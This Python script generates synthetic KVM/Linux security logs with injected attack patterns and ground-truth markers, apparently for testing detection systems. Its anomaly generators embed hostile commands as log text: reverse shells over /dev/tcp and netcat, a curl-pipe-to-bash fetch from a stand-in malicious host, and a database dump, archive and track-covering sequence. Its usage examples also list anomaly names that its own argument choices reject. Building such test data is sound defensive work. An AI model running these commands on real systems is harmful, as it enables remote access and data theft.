#!/usr/bin/env python3
"""
Synthetic Security Log Generator for KVM/Linux Environments
Generates realistic logs with controllable anomalies for testing AI-powered detection systems

Author: Your Name
Usage: python log_generator.py --help
"""

import random
import json
import yaml
from datetime import datetime, timedelta
from pathlib import Path
from typing import List, Dict, Any, Optional
from dataclasses import dataclass, asdict
from enum import Enum
import ipaddress
import argparse


class LogType(Enum):
    """Types of logs to generate"""
    AUTH = "auth"
    SYSLOG = "syslog"
    FIREWALL = "firewall"
    KVM = "kvm"
    NETWORK = "network"
    APPLICATION = "application"


class AnomalyType(Enum):
    """Types of security anomalies to inject"""
    BRUTE_FORCE = "brute_force_attack"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    PORT_SCAN = "port_scan"
    LATERAL_MOVEMENT = "lateral_movement"
    DATA_EXFILTRATION = "data_exfiltration"
    SUSPICIOUS_PROCESS = "suspicious_process"
    UNAUTHORIZED_ACCESS = "unauthorized_access"
    CONFIGURATION_CHANGE = "unauthorized_config_change"
    RESOURCE_ABUSE = "resource_abuse"
    TIME_ANOMALY = "unusual_time_access"


@dataclass
class LogConfig:
    """Configuration for log generation"""
    start_time: datetime
    end_time: datetime
    normal_events_per_hour: int = 100
    vm_names: List[str] = None
    user_names: List[str] = None
    ip_ranges: List[str] = None
    services: List[str] = None
    
    def __post_init__(self):
        if self.vm_names is None:
            self.vm_names = [
                "web-server-01", "web-server-02", 
                "db-server-01", "app-server-01",
                "dev-vm-01", "dev-vm-02",
                "test-server-01", "monitoring-01",
                "backup-server-01", "vpn-gateway-01"
            ]
        
        if self.user_names is None:
            self.user_names = [
                "admin", "webadmin", "dbadmin", "developer",
                "operator", "monitor", "backup", "ansible",
                "jenkins", "gitlab-runner"
            ]
        
        if self.ip_ranges is None:
            self.ip_ranges = [
                "192.168.1.0/24",  # Management network
                "192.168.2.0/24",  # Production network
                "192.168.3.0/24",  # Development network
                "192.168.4.0/24",  # DMZ
            ]
        
        if self.services is None:
            self.services = [
                "sshd", "httpd", "nginx", "mysqld", "postgresql",
                "systemd", "libvirtd", "docker", "kubelet", "firewalld"
            ]


class LogGenerator:
    """Main log generator class"""
    
    def __init__(self, config: LogConfig):
        self.config = config
        self.generated_logs = []
        self.anomaly_markers = []  # Track where anomalies were injected
        
    def generate_ip_address(self, network: str = None) -> str:
        """Generate random IP address from specified network"""
        if network is None:
            network = random.choice(self.config.ip_ranges)
        
        net = ipaddress.IPv4Network(network)
        # Generate random IP in the network range
        random_ip = int(net.network_address) + random.randint(1, net.num_addresses - 2)
        return str(ipaddress.IPv4Address(random_ip))
    
    def generate_timestamp(self, base_time: datetime = None) -> datetime:
        """Generate realistic timestamp"""
        if base_time is None:
            time_range = (self.config.end_time - self.config.start_time).total_seconds()
            random_seconds = random.uniform(0, time_range)
            return self.config.start_time + timedelta(seconds=random_seconds)
        return base_time
    
    def generate_normal_auth_log(self, timestamp: datetime) -> str:
        """Generate normal SSH authentication log"""
        vm = random.choice(self.config.vm_names)
        user = random.choice(self.config.user_names)
        source_ip = self.generate_ip_address()
        
        templates = [
            f"{timestamp.strftime('%b %d %H:%M:%S')} {vm} sshd[{random.randint(1000, 9999)}]: Accepted publickey for {user} from {source_ip} port {random.randint(40000, 65000)} ssh2: RSA SHA256:{self._generate_key_fingerprint()}",
            f"{timestamp.strftime('%b %d %H:%M:%S')} {vm} sshd[{random.randint(1000, 9999)}]: pam_unix(sshd:session): session opened for user {user} by (uid=0)",
            f"{timestamp.strftime('%b %d %H:%M:%S')} {vm} sudo: {user} : TTY=pts/{random.randint(0, 5)} ; PWD=/home/{user} ; USER=root ; COMMAND=/usr/bin/systemctl status {random.choice(self.config.services)}",
            f"{timestamp.strftime('%b %d %H:%M:%S')} {vm} sshd[{random.randint(1000, 9999)}]: Received disconnect from {source_ip} port {random.randint(40000, 65000)}:11: disconnected by user",
        ]
        
        return random.choice(templates)
    
    def generate_normal_syslog(self, timestamp: datetime) -> str:
        """Generate normal system log entries"""
        vm = random.choice(self.config.vm_names)
        service = random.choice(self.config.services)
        
        templates = [
            f"{timestamp.strftime('%b %d %H:%M:%S')} {vm} {service}[{random.randint(1000, 9999)}]: Starting {service} service",
            f"{timestamp.strftime('%b %d %H:%M:%S')} {vm} {service}[{random.randint(1000, 9999)}]: Service {service} running normally",
            f"{timestamp.strftime('%b %d %H:%M:%S')} {vm} systemd[1]: Started {service}.service",
            f"{timestamp.strftime('%b %d %H:%M:%S')} {vm} kernel: [  {random.randint(100, 9999)}.{random.randint(100000, 999999)}] device eth0 entered promiscuous mode",
            f"{timestamp.strftime('%b %d %H:%M:%S')} {vm} systemd[1]: Reloading.",
        ]
        
        return random.choice(templates)
    
    def generate_normal_kvm_log(self, timestamp: datetime) -> str:
        """Generate normal KVM/libvirt logs"""
        vm = random.choice(self.config.vm_names)
        
        templates = [
            f"{timestamp.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} {random.randint(1000, 9999)}: info : libvirt version: 6.0.0, package: 37.el8 (CentOS Buildsys, 2020-09-01-00:00:00)",
            f"{timestamp.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} {random.randint(1000, 9999)}: info : Domain {vm} started",
            f"{timestamp.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} {random.randint(1000, 9999)}: info : Domain {vm} is running",
            f"{timestamp.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} {random.randint(1000, 9999)}: info : Domain {vm} CPU usage: {random.randint(5, 30)}%",
            f"{timestamp.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} {random.randint(1000, 9999)}: info : Domain {vm} memory usage: {random.randint(500, 2000)}MB",
        ]
        
        return random.choice(templates)
    
    def generate_normal_firewall_log(self, timestamp: datetime) -> str:
        """Generate normal firewall logs"""
        src_ip = self.generate_ip_address()
        dst_ip = self.generate_ip_address()
        
        protocols = ["TCP", "UDP", "ICMP"]
        protocol = random.choice(protocols)
        
        if protocol in ["TCP", "UDP"]:
            src_port = random.randint(1024, 65535)
            dst_port = random.choice([22, 80, 443, 3306, 5432, 8080])
            return f"{timestamp.strftime('%b %d %H:%M:%S')} kernel: ACCEPT IN=eth0 OUT= SRC={src_ip} DST={dst_ip} PROTO={protocol} SPT={src_port} DPT={dst_port}"
        else:
            return f"{timestamp.strftime('%b %d %H:%M:%S')} kernel: ACCEPT IN=eth0 OUT= SRC={src_ip} DST={dst_ip} PROTO={protocol}"
    
    def _generate_key_fingerprint(self) -> str:
        """Generate fake SSH key fingerprint"""
        import hashlib
        random_data = str(random.random()).encode()
        return hashlib.sha256(random_data).hexdigest()[:43]
    
    # ==================== ANOMALY GENERATORS ====================
    
    def inject_brute_force_attack(self, start_time: datetime, duration_minutes: int = 5) -> List[str]:
        """
        Inject SSH brute force attack pattern
        Characteristics: Many failed login attempts from same IP
        """
        logs = []
        attacker_ip = self.generate_ip_address("10.0.0.0/8")  # External IP
        target_vm = random.choice(self.config.vm_names)
        target_users = ["root", "admin", "administrator", "test", "oracle", "postgres"]
        
        attempts = random.randint(50, 200)
        
        self.anomaly_markers.append({
            "type": AnomalyType.BRUTE_FORCE.value,
            "start_time": start_time.isoformat(),
            "duration_minutes": duration_minutes,
            "source_ip": attacker_ip,
            "target_vm": target_vm,
            "attempts": attempts,
            "severity": "HIGH"
        })
        
        for i in range(attempts):
            timestamp = start_time + timedelta(seconds=random.uniform(0, duration_minutes * 60))
            user = random.choice(target_users)
            
            log = f"{timestamp.strftime('%b %d %H:%M:%S')} {target_vm} sshd[{random.randint(1000, 9999)}]: Failed password for {user} from {attacker_ip} port {random.randint(40000, 65000)} ssh2"
            logs.append((timestamp, log))
        
        # Add successful login at the end (breach!)
        final_time = start_time + timedelta(minutes=duration_minutes)
        breach_log = f"{final_time.strftime('%b %d %H:%M:%S')} {target_vm} sshd[{random.randint(1000, 9999)}]: Accepted password for {random.choice(target_users)} from {attacker_ip} port {random.randint(40000, 65000)} ssh2"
        logs.append((final_time, breach_log))
        
        return logs
    
    def inject_privilege_escalation(self, start_time: datetime) -> List[str]:
        """
        Inject privilege escalation attempt
        Characteristics: User trying to access restricted resources, sudo attempts
        """
        logs = []
        attacker_user = "developer"  # Compromised low-privilege account
        target_vm = random.choice(self.config.vm_names)
        attacker_ip = self.generate_ip_address()
        
        self.anomaly_markers.append({
            "type": AnomalyType.PRIVILEGE_ESCALATION.value,
            "start_time": start_time.isoformat(),
            "user": attacker_user,
            "target_vm": target_vm,
            "severity": "CRITICAL"
        })
        
        # Sequence of escalation attempts
        sequences = [
            f"{start_time.strftime('%b %d %H:%M:%S')} {target_vm} sshd[{random.randint(1000, 9999)}]: Accepted publickey for {attacker_user} from {attacker_ip} port {random.randint(40000, 65000)} ssh2",
            
            f"{(start_time + timedelta(seconds=30)).strftime('%b %d %H:%M:%S')} {target_vm} sudo: {attacker_user} : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/{attacker_user} ; USER=root ; COMMAND=/bin/bash",
            
            f"{(start_time + timedelta(seconds=45)).strftime('%b %d %H:%M:%S')} {target_vm} sudo: {attacker_user} : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/{attacker_user} ; USER=root ; COMMAND=/bin/bash",
            
            f"{(start_time + timedelta(seconds=60)).strftime('%b %d %H:%M:%S')} {target_vm} kernel: audit: type=1400 audit(1234567890.123:456): avc: denied {{ read }} for pid={random.randint(1000, 9999)} comm=\"bash\" name=\"shadow\" dev=\"dm-0\" ino=67890",
            
            f"{(start_time + timedelta(seconds=90)).strftime('%b %d %H:%M:%S')} {target_vm} {attacker_user}: attempted to access /etc/shadow",
            
            f"{(start_time + timedelta(seconds=120)).strftime('%b %d %H:%M:%S')} {target_vm} systemd[1]: Started Suspicious process by {attacker_user}",
            
            # Successful escalation using exploit
            f"{(start_time + timedelta(seconds=150)).strftime('%b %d %H:%M:%S')} {target_vm} kernel: traps: exploit[{random.randint(1000, 9999)}] general protection ip:7f{random.randint(1000000000, 9999999999):x}",
            
            f"{(start_time + timedelta(seconds=180)).strftime('%b %d %H:%M:%S')} {target_vm} su: (to root) {attacker_user} on pts/0",
            
            f"{(start_time + timedelta(seconds=200)).strftime('%b %d %H:%M:%S')} {target_vm} su: pam_unix(su:session): session opened for user root by {attacker_user}(uid=1000)",
        ]
        
        for i, log in enumerate(sequences):
            timestamp = start_time + timedelta(seconds=i * 30)
            logs.append((timestamp, log))
        
        return logs
    
    def inject_port_scan(self, start_time: datetime, duration_minutes: int = 2) -> List[str]:
        """
        Inject port scanning activity
        Characteristics: Rapid connection attempts to multiple ports
        """
        logs = []
        scanner_ip = self.generate_ip_address("10.0.0.0/8")
        target_vm = random.choice(self.config.vm_names)
        target_ip = self.generate_ip_address(self.config.ip_ranges[1])  # Production network
        
        ports_scanned = list(range(1, 1024)) + [3306, 5432, 6379, 27017, 8080, 8443, 9200]
        random.shuffle(ports_scanned)
        ports_scanned = ports_scanned[:100]  # Scan 100 ports
        
        self.anomaly_markers.append({
            "type": AnomalyType.PORT_SCAN.value,
            "start_time": start_time.isoformat(),
            "duration_minutes": duration_minutes,
            "source_ip": scanner_ip,
            "target_ip": target_ip,
            "ports_scanned": len(ports_scanned),
            "severity": "MEDIUM"
        })
        
        for port in ports_scanned:
            timestamp = start_time + timedelta(seconds=random.uniform(0, duration_minutes * 60))
            
            # Most ports will be blocked
            if random.random() < 0.95:
                log = f"{timestamp.strftime('%b %d %H:%M:%S')} kernel: DROP IN=eth0 OUT= SRC={scanner_ip} DST={target_ip} PROTO=TCP SPT={random.randint(40000, 65000)} DPT={port} SYN"
            else:
                # Few ports are open
                log = f"{timestamp.strftime('%b %d %H:%M:%S')} kernel: ACCEPT IN=eth0 OUT= SRC={scanner_ip} DST={target_ip} PROTO=TCP SPT={random.randint(40000, 65000)} DPT={port}"
            
            logs.append((timestamp, log))
        
        return logs
    
    def inject_lateral_movement(self, start_time: datetime) -> List[str]:
        """
        Inject lateral movement pattern
        Characteristics: Compromised account accessing multiple VMs in sequence
        """
        logs = []
        attacker_user = "developer"
        source_vm = "dev-vm-01"  # Compromised VM
        source_ip = self.generate_ip_address(self.config.ip_ranges[2])  # Dev network
        
        # Target production VMs
        target_vms = ["web-server-01", "db-server-01", "app-server-01"]
        
        self.anomaly_markers.append({
            "type": AnomalyType.LATERAL_MOVEMENT.value,
            "start_time": start_time.isoformat(),
            "user": attacker_user,
            "source_vm": source_vm,
            "target_vms": target_vms,
            "severity": "HIGH"
        })
        
        current_time = start_time
        
        for target_vm in target_vms:
            # SSH from compromised VM to target
            logs.append((
                current_time,
                f"{current_time.strftime('%b %d %H:%M:%S')} {target_vm} sshd[{random.randint(1000, 9999)}]: Accepted publickey for {attacker_user} from {source_ip} port {random.randint(40000, 65000)} ssh2"
            ))
            
            current_time += timedelta(seconds=30)
            
            # Reconnaissance
            logs.append((
                current_time,
                f"{current_time.strftime('%b %d %H:%M:%S')} {target_vm} {attacker_user}: executed: whoami;id;uname -a;ifconfig;cat /etc/passwd"
            ))
            
            current_time += timedelta(seconds=20)
            
            # File access
            logs.append((
                current_time,
                f"{current_time.strftime('%b %d %H:%M:%S')} {target_vm} {attacker_user}: accessed sensitive file: /var/db/production.sql"
            ))
            
            current_time += timedelta(seconds=40)
            
            # Network scanning from target
            logs.append((
                current_time,
                f"{current_time.strftime('%b %d %H:%M:%S')} {target_vm} {attacker_user}: executed: nmap -sV -p- {self.generate_ip_address(self.config.ip_ranges[1])}/24"
            ))
            
            current_time += timedelta(minutes=2)
        
        return logs
    
    def inject_data_exfiltration(self, start_time: datetime) -> List[str]:
        """
        Inject data exfiltration pattern
        Characteristics: Large data transfer to external IP
        """
        logs = []
        attacker_user = "backup"  # Compromised service account
        source_vm = "db-server-01"
        source_ip = self.generate_ip_address(self.config.ip_ranges[1])
        external_ip = self.generate_ip_address("8.8.0.0/16")  # External IP
        
        data_size_mb = random.randint(500, 5000)
        
        self.anomaly_markers.append({
            "type": AnomalyType.DATA_EXFILTRATION.value,
            "start_time": start_time.isoformat(),
            "user": attacker_user,
            "source_vm": source_vm,
            "destination_ip": external_ip,
            "data_size_mb": data_size_mb,
            "severity": "CRITICAL"
        })
        
        current_time = start_time
        
        # Database dump
        logs.append((
            current_time,
            f"{current_time.strftime('%b %d %H:%M:%S')} {source_vm} {attacker_user}: executed: mysqldump --all-databases > /tmp/backup.sql"
        ))
        
        current_time += timedelta(minutes=2)
        
        # Compression
        logs.append((
            current_time,
            f"{current_time.strftime('%b %d %H:%M:%S')} {source_vm} {attacker_user}: executed: tar -czf /tmp/data.tar.gz /tmp/backup.sql /var/www/uploads/ /etc/ssl/private/"
        ))
        
        current_time += timedelta(minutes=1)
        
        # Unusual network connection
        logs.append((
            current_time,
            f"{current_time.strftime('%b %d %H:%M:%S')} {source_vm} kernel: ACCEPT OUT=eth0 IN= SRC={source_ip} DST={external_ip} PROTO=TCP SPT={random.randint(40000, 65000)} DPT=443"
        ))
        
        # Large data transfer
        for i in range(10):
            current_time += timedelta(seconds=30)
            bytes_transferred = (data_size_mb * 1024 * 1024) // 10
            logs.append((
                current_time,
                f"{current_time.strftime('%b %d %H:%M:%S')} {source_vm} kernel: TRANSFER OUT=eth0 SRC={source_ip} DST={external_ip} BYTES={bytes_transferred}"
            ))
        
        # File deletion (covering tracks)
        current_time += timedelta(minutes=1)
        logs.append((
            current_time,
            f"{current_time.strftime('%b %d %H:%M:%S')} {source_vm} {attacker_user}: executed: rm -rf /tmp/backup.sql /tmp/data.tar.gz; history -c"
        ))
        
        return logs
    
    def inject_unusual_time_access(self, start_time: datetime) -> List[str]:
        """
        Inject unusual time access pattern (e.g., 3 AM activity from user who normally works 9-5)
        """
        logs = []
        user = "developer"
        vm = random.choice(self.config.vm_names)
        ip = self.generate_ip_address()
        
        # Set time to unusual hour (2-4 AM)
        unusual_time = start_time.replace(hour=random.randint(2, 4), minute=random.randint(0, 59))
        
        self.anomaly_markers.append({
            "type": AnomalyType.TIME_ANOMALY.value,
            "start_time": unusual_time.isoformat(),
            "user": user,
            "vm": vm,
            "severity": "MEDIUM",
            "note": "Activity during unusual hours (2-4 AM)"
        })
        
        # Login at unusual time
        logs.append((
            unusual_time,
            f"{unusual_time.strftime('%b %d %H:%M:%S')} {vm} sshd[{random.randint(1000, 9999)}]: Accepted publickey for {user} from {ip} port {random.randint(40000, 65000)} ssh2"
        ))
        
        # Unusual commands
        unusual_time += timedelta(minutes=5)
        logs.append((
            unusual_time,
            f"{unusual_time.strftime('%b %d %H:%M:%S')} {vm} {user}: executed: find / -name '*.conf' -o -name '*.key' -o -name '*.pem' 2>/dev/null"
        ))
        
        return logs
    
    def inject_suspicious_process(self, start_time: datetime) -> List[str]:
        """
        Inject suspicious process execution
        """
        logs = []
        vm = random.choice(self.config.vm_names)
        user = random.choice(["www-data", "nginx", "apache"])
        
        suspicious_commands = [
            "/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",  # Reverse shell
            "curl http://malicious.com/shell.sh | bash",      # Download and execute
            "python -c 'import socket,subprocess,os;...'",    # Python reverse shell
            "nc -e /bin/sh 10.0.0.1 4444",                   # Netcat backdoor
        ]
        
        command = random.choice(suspicious_commands)
        
        self.anomaly_markers.append({
            "type": AnomalyType.SUSPICIOUS_PROCESS.value,
            "start_time": start_time.isoformat(),
            "vm": vm,
            "user": user,
            "command": command,
            "severity": "CRITICAL"
        })
        
        logs.append((
            start_time,
            f"{start_time.strftime('%b %d %H:%M:%S')} {vm} {user}: executed: {command}"
        ))
        
        logs.append((
            start_time + timedelta(seconds=2),
            f"{(start_time + timedelta(seconds=2)).strftime('%b %d %H:%M:%S')} {vm} kernel: [SUSPICIOUS] Process spawned by web server: pid={random.randint(10000, 99999)} user={user} command={command[:30]}..."
        ))
        
        return logs
    
    def generate_baseline_logs(self, hours: int = 24) -> List[str]:
        """
        Generate baseline (normal) logs for specified duration
        """
        logs = []
        current_time = self.config.start_time
        end_time = current_time + timedelta(hours=hours)
        
        events_per_hour = self.config.normal_events_per_hour
        total_events = hours * events_per_hour
        
        log_generators = [
            self.generate_normal_auth_log,
            self.generate_normal_syslog,
            self.generate_normal_kvm_log,
            self.generate_normal_firewall_log,
        ]
        
        for _ in range(total_events):
            timestamp = self.generate_timestamp()
            if timestamp > end_time:
                continue
            
            generator = random.choice(log_generators)
            log_entry = generator(timestamp)
            logs.append((timestamp, log_entry))
        
        # Sort by timestamp
        logs.sort(key=lambda x: x[0])
        
        return [log for _, log in logs]
    
    def generate_logs_with_anomalies(
        self, 
        hours: int = 24,
        anomaly_types: List[AnomalyType] = None,
        anomaly_probability: float = 0.1
    ) -> Dict[str, Any]:
        """
        Generate logs with injected anomalies
        
        Args:
            hours: Duration of logs to generate
            anomaly_types: List of anomaly types to inject (None = all types)
            anomaly_probability: Probability of anomaly injection per hour
        
        Returns:
            Dictionary with logs and anomaly markers
        """
        if anomaly_types is None:
            anomaly_types = list(AnomalyType)
        
        all_logs = []
        current_time = self.config.start_time
        end_time = current_time + timedelta(hours=hours)
        
        # Generate normal baseline
        hour_count = 0
        while current_time < end_time:
            hour_end = current_time + timedelta(hours=1)
            
            # Generate normal events for this hour
            for _ in range(self.config.normal_events_per_hour):
                timestamp = current_time + timedelta(seconds=random.uniform(0, 3600))
                generator = random.choice([
                    self.generate_normal_auth_log,
                    self.generate_normal_syslog,
                    self.generate_normal_kvm_log,
                    self.generate_normal_firewall_log,
                ])
                log_entry = generator(timestamp)
                all_logs.append((timestamp, log_entry))
            
            # Randomly inject anomalies
            if random.random() < anomaly_probability:
                anomaly_type = random.choice(anomaly_types)
                anomaly_time = current_time + timedelta(minutes=random.randint(0, 59))
                
                anomaly_logs = []
                if anomaly_type == AnomalyType.BRUTE_FORCE:
                    anomaly_logs = self.inject_brute_force_attack(anomaly_time)
                elif anomaly_type == AnomalyType.PRIVILEGE_ESCALATION:
                    anomaly_logs = self.inject_privilege_escalation(anomaly_time)
                elif anomaly_type == AnomalyType.PORT_SCAN:
                    anomaly_logs = self.inject_port_scan(anomaly_time)
                elif anomaly_type == AnomalyType.LATERAL_MOVEMENT:
                    anomaly_logs = self.inject_lateral_movement(anomaly_time)
                elif anomaly_type == AnomalyType.DATA_EXFILTRATION:
                    anomaly_logs = self.inject_data_exfiltration(anomaly_time)
                elif anomaly_type == AnomalyType.TIME_ANOMALY:
                    anomaly_logs = self.inject_unusual_time_access(anomaly_time)
                elif anomaly_type == AnomalyType.SUSPICIOUS_PROCESS:
                    anomaly_logs = self.inject_suspicious_process(anomaly_time)
                
                all_logs.extend(anomaly_logs)
            
            current_time = hour_end
            hour_count += 1
        
        # Sort all logs by timestamp
        all_logs.sort(key=lambda x: x[0])
        
        return {
            "logs": [log for _, log in all_logs],
            "anomaly_markers": self.anomaly_markers,
            "metadata": {
                "start_time": self.config.start_time.isoformat(),
                "end_time": end_time.isoformat(),
                "total_logs": len(all_logs),
                "anomalies_injected": len(self.anomaly_markers),
                "duration_hours": hours
            }
        }
    
    def save_logs(self, logs_data: Dict[str, Any], output_dir: str = "generated_logs"):
        """
        Save generated logs to files
        """
        output_path = Path(output_dir)
        output_path.mkdir(exist_ok=True)
        
        timestamp_str = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Save logs
        log_file = output_path / f"security_logs_{timestamp_str}.log"
        with open(log_file, 'w') as f:
            for log in logs_data['logs']:
                f.write(log + '\n')
        
        # Save anomaly markers (ground truth)
        markers_file = output_path / f"anomaly_markers_{timestamp_str}.json"
        with open(markers_file, 'w') as f:
            json.dump({
                "anomaly_markers": logs_data['anomaly_markers'],
                "metadata": logs_data['metadata']
            }, f, indent=2)
        
        # Save summary
        summary_file = output_path / f"summary_{timestamp_str}.txt"
        with open(summary_file, 'w') as f:
            f.write("=" * 80 + '\n')
            f.write("LOG GENERATION SUMMARY\n")
            f.write("=" * 80 + '\n\n')
            f.write(f"Total logs generated: {logs_data['metadata']['total_logs']}\n")
            f.write(f"Duration: {logs_data['metadata']['duration_hours']} hours\n")
            f.write(f"Anomalies injected: {logs_data['metadata']['anomalies_injected']}\n\n")
            
            if logs_data['anomaly_markers']:
                f.write("ANOMALIES DETECTED:\n")
                f.write("-" * 80 + '\n')
                for i, marker in enumerate(logs_data['anomaly_markers'], 1):
                    f.write(f"\n{i}. {marker['type'].upper()}\n")
                    f.write(f"   Time: {marker['start_time']}\n")
                    f.write(f"   Severity: {marker['severity']}\n")
                    for key, value in marker.items():
                        if key not in ['type', 'start_time', 'severity']:
                            f.write(f"   {key}: {value}\n")
        
        print(f"\n✅ Logs saved to: {log_file}")
        print(f"✅ Anomaly markers saved to: {markers_file}")
        print(f"✅ Summary saved to: {summary_file}")
        
        return log_file, markers_file, summary_file


def main():
    """Main entry point with CLI"""
    parser = argparse.ArgumentParser(
        description="Generate synthetic security logs with controllable anomalies",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Generate 24 hours of logs with random anomalies
  python log_generator.py --hours 24
  
  # Generate logs with only brute force attacks
  python log_generator.py --hours 12 --anomalies brute_force
  
  # Generate baseline (no anomalies)
  python log_generator.py --hours 24 --baseline
  
  # Multiple specific anomalies
  python log_generator.py --hours 48 --anomalies brute_force lateral_movement data_exfiltration
        """
    )
    
    parser.add_argument(
        '--hours',
        type=int,
        default=24,
        help='Hours of logs to generate (default: 24)'
    )
    
    parser.add_argument(
        '--baseline',
        action='store_true',
        help='Generate only baseline (normal) logs, no anomalies'
    )
    
    parser.add_argument(
        '--anomalies',
        nargs='+',
        choices=[a.value for a in AnomalyType],
        help='Specific anomaly types to inject'
    )
    
    parser.add_argument(
        '--anomaly-probability',
        type=float,
        default=0.1,
        help='Probability of anomaly per hour (default: 0.1)'
    )
    
    parser.add_argument(
        '--events-per-hour',
        type=int,
        default=100,
        help='Normal events per hour (default: 100)'
    )
    
    parser.add_argument(
        '--output-dir',
        type=str,
        default='generated_logs',
        help='Output directory (default: generated_logs)'
    )
    
    args = parser.parse_args()
    
    # Create configuration
    config = LogConfig(
        start_time=datetime.now() - timedelta(hours=args.hours),
        end_time=datetime.now(),
        normal_events_per_hour=args.events_per_hour
    )
    
    # Create generator
    generator = LogGenerator(config)
    
    print("\n" + "=" * 80)
    print("SYNTHETIC SECURITY LOG GENERATOR")
    print("=" * 80)
    print(f"\n📅 Generating {args.hours} hours of logs...")
    print(f"⏰ Time range: {config.start_time} to {config.end_time}")
    
    if args.baseline:
        print("📊 Mode: BASELINE (no anomalies)")
        logs = generator.generate_baseline_logs(hours=args.hours)
        logs_data = {
            "logs": logs,
            "anomaly_markers": [],
            "metadata": {
                "start_time": config.start_time.isoformat(),
                "end_time": config.end_time.isoformat(),
                "total_logs": len(logs),
                "anomalies_injected": 0,
                "duration_hours": args.hours
            }
        }
    else:
        anomaly_types = None
        if args.anomalies:
            anomaly_types = [AnomalyType(a) for a in args.anomalies]
            print(f"🎯 Anomaly types: {', '.join(args.anomalies)}")
        else:
            print("🎲 Anomaly types: RANDOM (all types)")
        
        print(f"📈 Anomaly probability: {args.anomaly_probability * 100}% per hour")
        
        logs_data = generator.generate_logs_with_anomalies(
            hours=args.hours,
            anomaly_types=anomaly_types,
            anomaly_probability=args.anomaly_probability
        )
    
    # Save logs
    generator.save_logs(logs_data, output_dir=args.output_dir)
    
    print("\n✨ Generation complete!")
    print("=" * 80 + "\n")


if __name__ == "__main__":
    main()